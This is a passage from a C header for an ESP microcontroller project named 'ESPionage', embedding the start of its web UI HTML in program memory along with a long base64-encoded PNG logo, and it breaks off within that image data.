#pragma once
#include <pgmspace.h>

// Web files embedded in PROGMEM. Edit these to change the UI.
// For bigger UIs you'd use LittleFS + the SPIFFS/LittleFS uploader plugin.

static const char INDEX_HTML[] PROGMEM = R"HTML(<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="theme-color" content="#0b0f14">
<title>ESPionage</title>
<link rel="stylesheet" href="/style.css">
</head>
<body>
<header>
  <div class="title">
    <span class="dot" id="conn"></span>
    <img src="data:image/png;base64,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